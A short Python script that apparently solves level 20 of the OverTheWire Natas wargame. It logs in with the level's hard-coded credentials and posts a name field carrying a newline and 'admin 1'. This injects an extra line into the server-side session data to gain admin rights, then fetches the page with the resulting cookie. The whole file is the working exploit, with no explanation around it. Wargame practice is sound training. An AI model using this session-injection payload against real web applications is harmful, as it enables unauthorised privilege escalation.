import requests

username="natas20"
password="guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"
url="http://natas20.natas.labs.overthewire.org/index.php"

payload= dict(name="test\nadmin 1")

r= requests.post(url, auth=(username, password), data=payload)
cookie= r.cookies.get_dict()

d= requests.get(url, auth=(username, password), cookies=cookie)
print(d.content)
